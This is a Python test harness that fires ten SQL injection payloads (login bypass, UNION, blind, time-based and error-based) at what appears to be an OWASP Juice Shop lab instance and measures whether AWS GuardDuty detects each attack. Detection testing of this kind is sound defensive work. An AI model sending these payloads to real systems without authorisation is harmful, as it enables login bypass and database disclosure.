#!/usr/bin/env python3

import requests
import json
import time
from datetime import datetime, timezone
from typing import Dict, List, Any
from guardduty_monitor import GuardDutyMonitor


class SQLiTestSuite:
    def __init__(self, target_url: str, aws_region: str = 'eu-west-2'):
        self.target_url = target_url.rstrip('/')
        self.aws_region = aws_region
        self.monitor = GuardDutyMonitor(aws_region)
        self.results: List[Dict[str, Any]] = []
        
    def execute_sqli_attack(self, test_id: str, endpoint: str, 
                           payload: str, method: str = 'POST',
                           param_name: str = 'email') -> Dict[str, Any]:
        url = f"{self.target_url}{endpoint}"
        attack_time = datetime.now(timezone.utc)
        
        try:
            if method.upper() == 'POST':
                data = {param_name: payload, "password": "test123"}
                response = requests.post(url, json=data, timeout=10)
            else:
                params = {param_name: payload}
                response = requests.get(url, params=params, timeout=10)
            
            return {
                'success': True,
                'status_code': response.status_code,
                'response_time_ms': response.elapsed.total_seconds() * 1000,
                'attack_time': attack_time.isoformat()
            }
        except requests.RequestException as e:
            return {
                'success': False,
                'error': str(e),
                'attack_time': attack_time.isoformat()
            }
    
    def run_test(self, test_config: Dict[str, Any], 
                 monitoring_duration_minutes: int = 2) -> Dict[str, Any]:
        test_id = test_config['test_id']
        technique = test_config['technique']
        start_time = datetime.now(timezone.utc)
        attack_result = self.execute_sqli_attack(
            test_id=test_id,
            endpoint=test_config['endpoint'],
            payload=test_config['payload'],
            method=test_config.get('method', 'POST'),
            param_name=test_config.get('param_name', 'email')
        )
        attack_end_time = datetime.now(timezone.utc)
        
        findings = self.monitor.monitor_findings(attack_start_time=start_time,
                                                 duration_minutes=monitoring_duration_minutes,
                                                 poll_interval_seconds=30)
        correlated_findings = []
        ignored_findings = []
        for finding in findings:
            if not self.monitor.is_relevant_finding(finding):
                ignored_findings.append(finding['Type'])
                continue

            is_correlated, ttd = self.monitor.correlate_finding_with_attack(
                finding,
                start_time,
                attack_end_time=attack_end_time,
                tolerance_minutes=monitoring_duration_minutes,
            )
            if is_correlated:
                correlated_findings.append({
                    'finding_id': finding['Id'],
                    'type': finding['Type'],
                    'severity': finding['Severity'],
                    'time_to_detect_seconds': ttd,
                    'description': finding.get('Description', '')
                })
        
        result = {
            'test_id': test_id,
            'description': test_config['description'],
            'technique': technique,
            'endpoint': test_config['endpoint'],
            'payload': test_config['payload'],
            'attack_executed': attack_result['success'],
            'attack_details': attack_result,
            'monitoring_duration_minutes': monitoring_duration_minutes,
            'total_findings': len(findings),
            'ignored_findings': len(ignored_findings),
            'ignored_finding_types': ignored_findings,
            'correlated_findings': len(correlated_findings),
            'detected': len(correlated_findings) > 0,
            'findings': correlated_findings,
            'start_time': start_time.isoformat()
        }
        
        return result
    
    def run_full_suite(self, monitoring_duration_minutes: int = 2):
        test_cases = [
            # --- Original 5 scenarios (SQL-01 to SQL-05) ---
            {
                'test_id': 'SQL-01',
                'description': 'Authentication Bypass - Boolean-based blind SQLi',
                'technique': 'Boolean-based blind (Auth Bypass)',
                'endpoint': '/rest/user/login',
                'payload': "' OR '1'='1'--",
                'param_name': 'email',
                'method': 'POST'
            },
            {
                'test_id': 'SQL-02',
                'description': 'UNION-based SQLi - Data extraction via product search',
                'technique': 'UNION-based',
                'endpoint': '/api/Products',
                'payload': "' UNION SELECT null,null,null,null,null,null,null,null,null--",
                'param_name': 'q',
                'method': 'GET'
            },
            {
                'test_id': 'SQL-03',
                'description': 'Boolean-based blind SQLi - Product search inference',
                'technique': 'Boolean-based blind',
                'endpoint': '/rest/products/search',
                'payload': "' AND '1'='1",
                'param_name': 'q',
                'method': 'GET'
            },
            {
                'test_id': 'SQL-04',
                'description': 'Time-based blind SQLi - Feedback endpoint delay',
                'technique': 'Time-based blind',
                'endpoint': '/api/Feedbacks',
                'payload': "'; SLEEP(5)--",
                'param_name': 'id',
                'method': 'GET'
            },
            {
                'test_id': 'SQL-05',
                'description': 'Error-based SQLi - Database version disclosure',
                'technique': 'Error-based',
                'endpoint': '/rest/basket/1',
                'payload': "' AND 1=CONVERT(int,@@version)--",
                'param_name': 'id',
                'method': 'GET'
            },
            # --- Expanded scenarios (SQL-06 to SQL-10) ---
            {
                'test_id': 'SQL-06',
                'description': 'Authentication Bypass - Tautology-based login bypass',
                'technique': 'Boolean-based blind (Auth Bypass)',
                'endpoint': '/rest/user/login',
                'payload': "admin'--",
                'param_name': 'email',
                'method': 'POST'
            },
            {
                'test_id': 'SQL-07',
                'description': 'UNION-based SQLi - Column count enumeration',
                'technique': 'UNION-based',
                'endpoint': '/rest/products/search',
                'payload': "' UNION SELECT null,null,null,null,null,null,null,null,null FROM sqlite_master--",
                'param_name': 'q',
                'method': 'GET'
            },
            {
                'test_id': 'SQL-08',
                'description': 'Boolean-based blind SQLi - Substring extraction via feedback',
                'technique': 'Boolean-based blind',
                'endpoint': '/api/Feedbacks',
                'payload': "test' AND SUBSTR((SELECT sql FROM sqlite_master LIMIT 1),1,1)='C'--",
                'param_name': 'comment',
                'method': 'GET'
            },
            {
                'test_id': 'SQL-09',
                'description': 'Time-based blind SQLi - Conditional delay on login',
                'technique': 'Time-based blind',
                'endpoint': '/rest/user/login',
                'payload': "' OR 1=1; WAITFOR DELAY '00:00:05'--",
                'param_name': 'email',
                'method': 'POST'
            },
            {
                'test_id': 'SQL-10',
                'description': 'Error-based SQLi - Type coercion on product search',
                'technique': 'Error-based',
                'endpoint': '/rest/products/search',
                'payload': "' AND 1=CAST((SELECT name FROM sqlite_master LIMIT 1) AS int)--",
                'param_name': 'q',
                'method': 'GET'
            }
        ]
        
        results = []

        for i, test_config in enumerate(test_cases, 1):
            print(f"\n[{i}/{len(test_cases)}] Running: {test_config['test_id']} - {test_config['description']}")
            print(f"  Endpoint: {test_config['endpoint']}")
            print(f"  Technique: {test_config['technique']}")
            result = self.run_test(test_config, monitoring_duration_minutes)
            status = "DETECTED" if result['detected'] else "NOT DETECTED"
            print(f"  Result: {status} | Attack success: {result['attack_executed']} | Findings: {result['correlated_findings']}")
            results.append(result)
            self.results.append(result)

            if i < len(test_cases):
                print(f"  Waiting 10s before next test...")
                time.sleep(10)
        
        self._print_summary(results)
        
        self._save_results(results)
        
        return results
    
    def _print_summary(self, results: List[Dict[str, Any]]):
        pass
    
    def _save_results(self, results: List[Dict[str, Any]]):
        output = {
            'test_suite': 'SQL Injection Detection Analysis',
            'target_url': self.target_url,
            'aws_region': self.aws_region,
            'execution_date': datetime.now(timezone.utc).isoformat(),
            'total_tests': len(results),
            'detection_summary': {
                'total_tests': len(results),
                'successful_attacks': sum(1 for r in results if r['attack_executed']),
                'detected': sum(1 for r in results if r['detected']),
                'detection_rate_percent': (sum(1 for r in results if r['detected']) / len(results) * 100) if results else 0
            },
            'test_results': results
        }
        
        filename = f"sqli_test_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(output, f, indent=2)


def main():
    import os
    import sys
    import logging

    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[logging.StreamHandler(sys.stdout)]
    )

    TARGET_URL = os.getenv("TARGET_URL", "http://<JUICE_SHOP_IP>")
    AWS_REGION = os.getenv("AWS_REGION", "eu-west-2")
    MONITORING_DURATION = 5

    print(f"\n{'='*60}")
    print(f"SQL INJECTION TEST SUITE - 10 Scenarios")
    print(f"Target: {TARGET_URL}")
    print(f"Region: {AWS_REGION}")
    print(f"Monitoring: {MONITORING_DURATION} min per test")
    print(f"{'='*60}\n")

    suite = SQLiTestSuite(TARGET_URL, AWS_REGION)
    results = suite.run_full_suite(monitoring_duration_minutes=MONITORING_DURATION)

    print(f"\n{'='*60}")
    print(f"COMPLETE - {len(results)} tests executed")
    detected = sum(1 for r in results if r['detected'])
    print(f"Detection rate: {detected}/{len(results)} ({detected/len(results)*100:.0f}%)")
    print(f"{'='*60}\n")


if __name__ == "__main__":
    main()
